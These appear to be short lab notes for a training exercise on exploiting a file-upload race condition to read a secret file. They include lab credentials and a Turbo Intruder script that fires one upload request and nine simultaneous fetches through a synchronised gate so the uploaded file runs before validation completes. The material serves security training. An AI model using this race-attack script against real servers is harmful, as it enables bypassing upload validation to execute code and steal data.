
Target Goal - Exploit file upload vulnerability to exfiltrate the contents of the /home/carlos/secret

Creds - wiener:peter

Analysis:

The race condition is for very short time!
We try to call the file before validation on the server is done.
Need Turbo Intruder in burp!


def queueRequests(target, wordlists):
    engine = RequestEngine(endpoint=target.endpoint,
                           concurrentConnections=10,
                           requestsPerConnection=100,
                           pipeline=False
                           )

    request1 = '''
<add post request here>
'''

    
    request2 = '''
<add get request here>
\r\n
'''

    # the 'gate' argument blocks the final byte of each request until openGate is invoked
    engine.queue(request1, gate='race1')
    for i in range(9):
        engine.queue(request2, gate='race1')

    # wait until every 'race1' tagged request is ready
    # then send the final byte of each request
    # (this method is non-blocking, just like queue)
    engine.openGate('race1')

    engine.complete(timeout=60)


def handleResponse(req, interesting):
    table.add(req)


